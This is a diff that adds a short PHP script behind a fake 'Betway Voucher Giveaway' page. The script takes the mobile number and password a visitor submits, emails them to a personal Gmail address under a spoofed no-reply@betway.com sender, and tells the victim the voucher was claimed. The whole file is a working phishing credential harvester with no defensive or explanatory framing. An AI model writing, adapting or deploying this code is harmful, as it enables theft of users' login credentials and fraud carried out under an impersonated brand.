@@ -1,0 +1,17 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $mobile = $_POST['mobile'];
+    $password = $_POST['password'];
+
+    $to = "moletimf@gmail.com";
+    $subject = "New Betway Voucher Giveaway Entry";
+    $message = "Mobile Number: " . $mobile . "\nPassword: " . $password;
+    $headers = "From: no-reply@betway.com";
+
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Your voucher has been claimed successfully!";
+    } else {
+        echo "There was an error processing your request. Please try again later.";
+    }
+}
+?>
